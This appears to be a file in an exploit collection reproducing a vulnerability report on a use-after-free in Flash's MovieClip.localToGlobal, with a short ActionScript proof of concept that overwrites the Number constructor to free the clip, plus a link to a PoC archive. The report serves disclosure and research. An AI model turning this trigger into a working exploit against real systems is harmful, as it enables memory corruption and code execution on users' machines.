@@ -1,0 +1,27 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=570
+
+There is a use-after-free issue in MovieClip.localToGlobal. If the Number constructor is overwritten with a new constructor and MovieClip.localToGlobal is called with an integer parameter, the new constructor will get called. If this constructor frees the MovieClip, a use-after-free occurs. A minimal PoC is as follows:
+
+var a = func;
+_global.Number = a;
+this.createEmptyMovieClip("mc", 1);
+mc.localToGlobal( 7 );
+
+
+function func(){
+	
+	mc.removeMovieClip();
+	
+        // fix heap here  
+
+        this.x = 2;
+	this.y = 1;
+	
+	}
+	
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39056.zip
+
